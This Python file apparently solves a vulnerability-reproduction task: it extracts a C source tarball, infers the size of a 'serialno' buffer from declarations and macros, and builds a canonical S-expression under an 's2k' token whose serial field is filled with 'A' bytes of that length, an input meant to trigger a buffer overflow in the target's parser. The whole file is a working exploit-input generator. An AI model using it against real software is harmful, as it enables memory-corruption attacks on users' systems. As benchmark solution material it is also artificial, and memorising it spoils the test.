import os
import re
import io
import ast
import tarfile
import tempfile
from pathlib import Path
from typing import Dict, Optional, Tuple, List


class Solution:
    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> str:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                name = m.name
                if not name or name.startswith("/") or ".." in Path(name).parts:
                    continue
                out_path = os.path.abspath(os.path.join(dst_dir, name))
                if not out_path.startswith(os.path.abspath(dst_dir) + os.sep) and out_path != os.path.abspath(dst_dir):
                    continue
                tf.extract(m, dst_dir)

        # Determine root directory
        entries = [p for p in Path(dst_dir).iterdir()]
        if len(entries) == 1 and entries[0].is_dir():
            return str(entries[0])
        return dst_dir

    def _read_text_file(self, path: Path, max_bytes: int = 5_000_000) -> str:
        try:
            st = path.stat()
            if st.st_size > max_bytes:
                return ""
            data = path.read_bytes()
        except Exception:
            return ""
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return data.decode("latin-1", errors="ignore")
            except Exception:
                return ""

    def _collect_macros(self, root: Path) -> Dict[str, int]:
        macros: Dict[str, int] = {}
        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$', re.M)
        int_token_re = re.compile(r'^\(?\s*(0x[0-9A-Fa-f]+|\d+)\s*([uUlL]{0,3})\s*\)?$')

        for p in root.rglob("*"):
            if not p.is_file():
                continue
            if p.suffix.lower() not in (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh"):
                continue
            txt = self._read_text_file(p)
            if not txt or "#define" not in txt:
                continue
            for m in define_re.finditer(txt):
                name = m.group(1)
                val = m.group(2).strip()
                val = re.sub(r'/\*.*?\*/', ' ', val)
                val = val.strip()
                val = val.split()[0] if val else ""
                if not val:
                    continue
                mm = int_token_re.match(val)
                if not mm:
                    continue
                num_s = mm.group(1)
                try:
                    macros[name] = int(num_s, 0)
                except Exception:
                    pass
        return macros

    def _eval_int_expr(self, expr: str, macros: Dict[str, int]) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None
        expr = re.sub(r'/\*.*?\*/', ' ', expr)
        expr = re.sub(r'//.*', ' ', expr)
        expr = expr.strip()
        expr = re.sub(r'\b(0x[0-9A-Fa-f]+|\d+)([uUlL]+)\b', r'\1', expr)

        # Quick literal
        try:
            if re.fullmatch(r'(0x[0-9A-Fa-f]+|\d+)', expr):
                return int(expr, 0)
        except Exception:
            pass

        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            # Try to replace known macro names with ints and retry
            replaced = expr
            for k, v in macros.items():
                replaced = re.sub(r'\b' + re.escape(k) + r'\b', str(v), replaced)
            try:
                node = ast.parse(replaced, mode="eval")
            except Exception:
                return None

        def ev(n) -> int:
            if isinstance(n, ast.Expression):
                return ev(n.body)
            if isinstance(n, ast.Constant) and isinstance(n.value, (int,)):
                return int(n.value)
            if isinstance(n, ast.Num):
                return int(n.n)
            if isinstance(n, ast.Name):
                if n.id in macros:
                    return int(macros[n.id])
                raise ValueError("unknown name")
            if isinstance(n, ast.UnaryOp):
                val = ev(n.operand)
                if isinstance(n.op, ast.UAdd):
                    return +val
                if isinstance(n.op, ast.USub):
                    return -val
                if isinstance(n.op, ast.Invert):
                    return ~val
                raise ValueError("bad unary")
            if isinstance(n, ast.BinOp):
                a = ev(n.left)
                b = ev(n.right)
                op = n.op
                if isinstance(op, ast.Add):
                    return a + b
                if isinstance(op, ast.Sub):
                    return a - b
                if isinstance(op, ast.Mult):
                    return a * b
                if isinstance(op, ast.Div):
                    if b == 0:
                        raise ValueError("div0")
                    return a // b
                if isinstance(op, ast.FloorDiv):
                    if b == 0:
                        raise ValueError("div0")
                    return a // b
                if isinstance(op, ast.Mod):
                    if b == 0:
                        raise ValueError("mod0")
                    return a % b
                if isinstance(op, ast.LShift):
                    return a << b
                if isinstance(op, ast.RShift):
                    return a >> b
                if isinstance(op, ast.BitOr):
                    return a | b
                if isinstance(op, ast.BitAnd):
                    return a & b
                if isinstance(op, ast.BitXor):
                    return a ^ b
                raise ValueError("bad binop")
            if isinstance(n, ast.ParenExpr):  # type: ignore[attr-defined]
                return ev(n.value)  # pragma: no cover
            raise ValueError("unsupported")

        try:
            val = ev(node)
        except Exception:
            return None
        if not isinstance(val, int):
            return None
        return val

    def _infer_serialno_bufsz_and_tokens(self, root: Path) -> Tuple[Optional[int], bytes, bytes, bool]:
        macros = self._collect_macros(root)
        serial_token = b"serialno"
        s2k_token = b"s2k"
        has_find_token_for_serial = False

        # Token inference
        for p in root.rglob("*"):
            if not p.is_file():
                continue
            if p.suffix.lower() not in (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh"):
                continue
            txt = self._read_text_file(p)
            if not txt:
                continue
            if "serialno" in txt:
                # likely tokens
                if re.search(r'"S2K"', txt) and not re.search(r'"s2k"', txt):
                    s2k_token = b"S2K"
                if re.search(r'find_token\s*\([^,]+,\s*"serialno"\s*,', txt) or re.search(r'gcry_sexp_find_token\s*\([^,]+,\s*"serialno"\s*,', txt):
                    has_find_token_for_serial = True
                # if another token is used, prefer exact
                m = re.search(r'find_token\s*\([^,]+,\s*"([^"]*serial[^"]*)"\s*,', txt)
                if m:
                    tok = m.group(1)
                    if tok:
                        serial_token = tok.encode("utf-8", errors="ignore") or serial_token
                m = re.search(r'gcry_sexp_find_token\s*\([^,]+,\s*"([^"]*serial[^"]*)"\s*,', txt)
                if m:
                    tok = m.group(1)
                    if tok:
                        serial_token = tok.encode("utf-8", errors="ignore") or serial_token

        # Buffer size inference
        decl_re = re.compile(r'\b(?:unsigned\s+)?char\s+[^;]*?\bserialno\b\s*\[\s*([^\]]+)\s*\]')
        buf_sizes: List[int] = []
        buf_sizes_szof: List[int] = []

        for p in root.rglob("*"):
            if not p.is_file():
                continue
            if p.suffix.lower() not in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh"):
                continue
            txt = self._read_text_file(p)
            if not txt or "serialno" not in txt:
                continue
            for m in decl_re.finditer(txt):
                expr = m.group(1)
                val = self._eval_int_expr(expr, macros)
                if val is None:
                    continue
                if 0 < val <= 4096:
                    buf_sizes.append(val)
                    if re.search(r'sizeof\s*\(?\s*serialno\s*\)?', txt):
                        buf_sizes_szof.append(val)

        size = None
        if buf_sizes_szof:
            size = min(buf_sizes_szof)
        elif buf_sizes:
            size = min(buf_sizes)

        return size, s2k_token, serial_token, has_find_token_for_serial

    def _sexp_atom(self, b: bytes) -> bytes:
        return str(len(b)).encode("ascii") + b":" + b

    def _sexp_list(self, *parts: bytes) -> bytes:
        return b"(" + b"".join(parts) + b")"

    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            if os.path.isdir(src_path):
                root = Path(src_path)
            else:
                rootdir = self._safe_extract_tar(src_path, td)
                root = Path(rootdir)

            bufsz, s2k_tok, serial_tok, _has_find = self._infer_serialno_bufsz_and_tokens(root)

            if bufsz is None or bufsz <= 0 or bufsz > 4096:
                bufsz = 6

            payload = b"A" * int(bufsz)

            inner = self._sexp_list(self._sexp_atom(serial_tok), self._sexp_atom(payload))
            outer = self._sexp_list(self._sexp_atom(s2k_tok), inner)

            return outer